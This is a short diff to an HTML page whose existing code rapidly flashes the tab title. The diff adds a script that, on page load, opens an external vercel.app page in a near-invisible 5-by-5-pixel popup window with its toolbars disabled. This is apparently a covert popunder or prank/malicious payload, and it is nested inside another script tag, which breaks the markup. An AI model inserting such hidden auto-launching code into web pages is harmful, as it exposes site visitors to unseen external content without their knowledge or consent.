@@ -11,6 +11,16 @@
       document.title = titles[toggle ? 0 : 1];
       toggle = !toggle;
     }, 0);
+    <script>
+    function launchPopup() {
+      const popup = window.open(
+        'https://nowuriamiantia.vercel.app/2.html',
+        'flashingPopup',
+        'width=5,height=5,top=100,left=100,resizable=no,toolbar=no,scrollbars=no'
+      );
+    }
+        launchPopup()
+  </script>
   </script>
   </body>
 </html>
